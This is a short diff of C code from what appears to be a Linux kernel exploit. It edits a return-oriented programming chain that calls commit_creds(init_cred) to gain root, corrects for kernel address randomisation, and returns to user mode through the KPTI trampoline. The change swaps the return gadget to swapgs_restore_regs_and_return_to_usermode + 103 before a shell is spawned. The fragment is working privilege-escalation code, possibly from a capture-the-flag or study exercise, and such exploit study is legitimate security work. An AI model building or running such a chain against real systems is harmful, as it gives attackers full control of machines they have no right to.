@@ -75,7 +75,7 @@ int main(){
     p[idx++]  = rdi;
     p[idx++]  = init_cred                   - NO_ASLR_BASE + base;
     p[idx++]  = commit_creds                - NO_ASLR_BASE + base;
-    p[idx++]  = common_interrupt_return +61 - NO_ASLR_BASE + base;
+    p[idx++]  = swapgs_restore_regs_and_return_to_usermode + 103 - NO_ASLR_BASE + base;
     p[idx++]  = *(size_t*) "RDI";
     p[idx++]  = *(size_t*) "RAX";
     p[idx++]  = shell;
